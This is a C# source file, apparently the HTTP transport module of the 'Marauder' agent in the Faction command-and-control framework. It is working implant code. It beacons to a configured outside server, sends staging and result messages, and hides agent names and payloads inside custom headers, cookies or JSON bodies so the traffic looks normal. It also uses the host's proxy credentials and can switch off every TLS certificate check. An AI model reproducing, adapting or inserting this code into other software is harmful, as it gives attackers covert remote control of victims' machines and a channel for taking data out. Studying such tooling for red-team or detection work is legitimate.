using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using System.IO;
using System.Reflection;
using Faction.Modules.Dotnet.Common;
using Newtonsoft.Json;

namespace Faction.Modules.Dotnet
{
  #if DEBUG
    public static class Logging
    {
      public static void Log(string message) {
        Console.WriteLine($"({DateTime.Now.ToString("o")}) [Marauder HTTP Transport] - {message}");
      }
    }
#endif
  public class HTTPTransport : AgentTransport
  {
    public class Profile
    {
      public Dictionary<string, Dictionary<string, string>> HttpGet { get; set; }
      public Dictionary<string, Dictionary<string, string>> HttpPost { get; set; }
    }

    public override string Name { get { return "HTTP"; } }
    public Profile _profile;
    public HTTPTransport() {
      try {
#if DEBUG
        Logging.Log($"Initializing..");
#endif
        Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HttpTransport.settings.json");
        _profile = JsonConvert.DeserializeObject<Profile>(new StreamReader(settingsStream).ReadToEnd());
      }
      catch (Exception e) {
#if DEBUG
        Logging.Log($"Problem initializing transport: {e.Message}");
#endif
      }
    }

    private WebClient CreateWebClient(bool ignoreSSL, string profile)
    {
#if DEBUG
        Logging.Log($"Creating Web Client..");
#endif
      WebClient _webClient = new WebClient();

      // add proxy aware webclient settings
      _webClient.Proxy = WebRequest.DefaultWebProxy;
      _webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

      if (ignoreSSL)
      {
#if DEBUG
        Logging.Log($"Ignoring SSL per configuration..");
#endif
        //Change SSL checks so that all checks pass
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
      }

      if (profile == "HttpGet")
      {
        if (_profile.HttpGet.ContainsKey("Headers") && _profile.HttpGet["Headers"].Count != 0)
        {
          foreach (var header in _profile.HttpGet["Headers"])
            _webClient.Headers.Add(header.Key, header.Value);

        }
        if (_profile.HttpGet.ContainsKey("Cookies") && _profile.HttpGet["Cookies"].Count != 0)
        {
          foreach (var cookie in _profile.HttpGet["Cookies"])
            _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");

        }
      }
      if (profile == "HttpPost")
      {
        if (_profile.HttpPost.ContainsKey("Headers") && _profile.HttpPost["Headers"].Count != 0)
        {
          foreach (var header in _profile.HttpPost["Headers"])
            _webClient.Headers.Add(header.Key, header.Value);

        }
        if (_profile.HttpPost.ContainsKey("Cookies") && _profile.HttpPost["Cookies"].Count != 0)
        {
          foreach (var cookie in _profile.HttpPost["Cookies"])
            _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");

        }
      }

      return _webClient;
    }
    private Dictionary<string, string> DoStagePost(string StageName, string StagingId, string StageMessage)
    {
#if DEBUG
      Logging.Log($"Doing a Stage POST.");
#endif
      Dictionary<string, string> response = new Dictionary<string, string>();

      try
      {
        string beaconUrl = String.Format($"{_profile.HttpPost["Server"]["Host"]}{_profile.HttpPost["Server"]["URLs"]}");

        bool _ignoreSSL = _profile.HttpPost["Server"]["IgnoreSSL"] == "true";

#if DEBUG
        Logging.Log($"IgnoreSSL set to {_ignoreSSL}");
#endif

        // Create a new WebClient object and load the Headers/Cookies per the Client Profile
        WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpPost");

        // Add the Stage Message into the request per the configuration
        var _messageLocation = _profile.HttpPost["ClientPayload"]["Message"];
        if (_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], StageMessage);
        if (_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={StageMessage}");

        // For a Staging Message, map AgentName to StagingId
        var _agentLocation = _profile.HttpPost["ClientPayload"]["AgentName"];
        if (_agentLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_agentLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], StagingId);
        if (_agentLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_agentLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={StagingId}");

        var _nameLocation = _profile.HttpPost["ClientPayload"]["StageName"];
        if (_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], StageName);
        if (_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={StageName}");

        // get all the properties that should be in the Body section
        var _bodyProperties = _profile.HttpPost["ClientPayload"]
            .Where(v => v.Value.Contains("Body"));

        Dictionary<string, string> _bodyContent = new Dictionary<string, string>();

        foreach (var property in _bodyProperties)
        {
          if (property.Key == "StageName")
            _bodyContent.Add($"{property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageName}");
          if (property.Key == "AgentName")
            _bodyContent.Add($"{property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StagingId}");
          if (property.Key == "Message")
            _bodyContent.Add($"{property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageMessage}");
        }

        string jsonMessage = JsonConvert.SerializeObject(_bodyContent);

        _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");
#if DEBUG
        Logging.Log($"Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
#endif
        string content = _webClient.UploadString(beaconUrl, jsonMessage);

        // parse the content based on the "shared" configuration
        response = GetPayloadContent(content, _webClient.ResponseHeaders, "HttpPost");

        return response;
     }
      catch (Exception e)
      {
        // We don't want to cause an breaking exception if it fails to connect
#if DEBUG
        Logging.Log($"Connection failed: {e.Message}");
#endif

        response.Add("Message", "ERROR");
        return response;
      }
    }

    private Dictionary<string, string> DoGetRequest(string AgentName, string Message)
    {
#if DEBUG
      Logging.Log($"Doing a GET.");
#endif
      Dictionary<string, string> response = new Dictionary<string, string>();

      try
      {
        string beaconUrl = String.Format($"{_profile.HttpGet["Server"]["Host"]}/faction.html", AgentName);

        bool _ignoreSSL = _profile.HttpGet["Server"]["IgnoreSSL"] == "true";

        // Create a new WebClient object and load the Headers/Cookies per the Client Profile
        WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpGet");

        // If Message is null we need to ensure that its an empty string
        if (String.IsNullOrEmpty(Message))
        {
          Message = "";
        }

        // Add the Beacon Message into the request per the configuration
        var _messageLocation = _profile.HttpGet["ClientPayload"]["Message"];
        if (_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], Message);
        if (_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");

        var _nameLocation = _profile.HttpGet["ClientPayload"]["AgentName"];
        if (_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
        if (_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");

#if DEBUG
        Logging.Log($"Sending Get. URL: {beaconUrl}");
#endif

        string content = _webClient.DownloadString(beaconUrl);
#if DEBUG
        Logging.Log($"Got response. {content}");
#endif

        // parse the content based on the "shared" configuration
        response = GetPayloadContent(content, _webClient.ResponseHeaders, "HttpGet");

        return response;
      }
      catch (Exception e)
      {
        // We don't want to cause an breaking exception if it fails to connect
#if DEBUG
        Logging.Log($"Connection failed: {e.Message}");
#endif

        response.Add("Message", "ERROR");
        return response;
      }
    }
    private Dictionary<string, string> DoPostRequest(string AgentName, string Message)
    {
#if DEBUG
      Logging.Log($"Doing a POST.");
#endif
      Dictionary<string, string> response = new Dictionary<string, string>();

      try
      {
        string beaconUrl = String.Format($"{_profile.HttpPost["Server"]["Host"]}{_profile.HttpPost["Server"]["URLs"]}", AgentName);

        bool _ignoreSSL = _profile.HttpPost["Server"]["IgnoreSSL"] == "true";

        // Create a new WebClient object and load the Headers/Cookies per the Client Profile
        WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpGet");

        // If Message is null we need to ensure that its an empty string
        if (String.IsNullOrEmpty(Message))
        {
          Message = "";
        }

        // Add the Beacon Message into the request per the configuration
        var _messageLocation = _profile.HttpPost["ClientPayload"]["Message"];
        if (_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], Message);
        if (_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");

        var _nameLocation = _profile.HttpPost["ClientPayload"]["AgentName"];
        if (_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          _webClient.Headers.Add(_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
        if (_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
          _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");

        // get all the properties that should be in the Body section
        var _bodyProperties = _profile.HttpPost["ClientPayload"]
            .Where(v => v.Value.Contains("Body"));

        Dictionary<string, string> _bodyContent = new Dictionary<string, string>();

        foreach (var property in _bodyProperties)
        {
          if (property.Key == "AgentName")
            _bodyContent.Add($"{property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{AgentName}");
          if (property.Key == "Message")
            _bodyContent.Add($"{property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{Message}");
        }

        string jsonMessage = JsonConvert.SerializeObject(_bodyContent);

        _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");

#if DEBUG
        Logging.Log($"Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
#endif

        string content = _webClient.UploadString(beaconUrl, jsonMessage);

        // parse the content based on the "shared" configuration
        response = GetPayloadContent(content, _webClient.ResponseHeaders, "HttpPost");

        return response;
      }
      catch (Exception e)
      {
        // We don't want to cause an breaking exception if it fails to connect
#if DEBUG
        Logging.Log($"Connection failed: {e.Message}");
#endif

        response.Add("Message", "ERROR");
        return response;
      }
    }
    private Dictionary<string, string> GetPayloadContent(string pageContent, WebHeaderCollection responseHeaders, string Profile)
    {

#if DEBUG
      Logging.Log($"Getting Payload Content..");
#endif
      Dictionary<string, string> _message = new Dictionary<string, string>();

      if (Profile == "HttpGet")
      {
        Dictionary<string, string> _payloadLocation = _profile.HttpGet["ServerPayload"];

        foreach (var property in _payloadLocation)
        {
          string _propKey = null;
          string _propValue;

          if (property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          {
            _propKey = property.Key;
            _propValue = responseHeaders[property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]];
            _message.Add(_propKey, _propValue);
          }

          if (property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
          {
            // Removing HtmlAgilityPack dependency

            // _propKey = property.Key;
            // HtmlDocument pageDocument = new HtmlDocument();
            // pageDocument.LoadHtml(pageContent);
            // _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
            // _message.Add(_propKey, _propValue);
          }
        }
      }
      if (Profile == "HttpPost")
      {
        Dictionary<string, string> _payloadLocation = _profile.HttpPost["ServerPayload"];

        foreach (var property in _payloadLocation)
        {
          string _propKey = null;
          string _propValue;

          if (property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
          {
            _propKey = property.Key;
            _propValue = responseHeaders[property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]];
            _message.Add(_propKey, _propValue);
          }

          if (property.Value.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
          {
            // Removing HtmlAgilityPack dependency

            // _propKey = property.Key;
            // HtmlDocument pageDocument = new HtmlDocument();
            // pageDocument.LoadHtml(pageContent);
            // _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
            // _message.Add(_propKey, _propValue);
          }
        }
      }

      return _message;
    }

    public override string Stage(string StageName, string StagingId, string Message)
    {
#if DEBUG
      Logging.Log($"Sending Stage Request. Name: {StageName}, Id: {StagingId}, Message: {Message}");
#endif
      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      responseDict = DoStagePost(StageName, StagingId, Message);

      return responseDict["Message"];
    }

    public override string Beacon(string AgentName, string Message)
    {
#if DEBUG
      Logging.Log($"Beaconing..");
#endif
      Dictionary<string, string> responseDict = new Dictionary<string, string>();

      // If there is no Message data, do a Get request (Check-in)
      if (String.IsNullOrEmpty(Message))
      {
#if DEBUG
        Logging.Log($"Sending Beacon: AgentName: {AgentName} Message: {Message}");
#endif
        responseDict = DoGetRequest(AgentName, Message);
      }

      // If we have data to return, do a Http Post
      else
      {
#if DEBUG
        Logging.Log($"Sending Beacon: AgentName: {AgentName} Message: {Message}");
#endif
        responseDict = DoPostRequest(AgentName, Message);
      }

      return responseDict["Message"];
    }
  }
  public class Initialize
  {
    public static List<AgentTransport> GetTransports()
    {
#if DEBUG
      Logging.Log($"Initializing..");
#endif

      List<AgentTransport> transports = new List<AgentTransport>();
      transports.Add(new HTTPTransport());
      return transports;
    }
  }
}
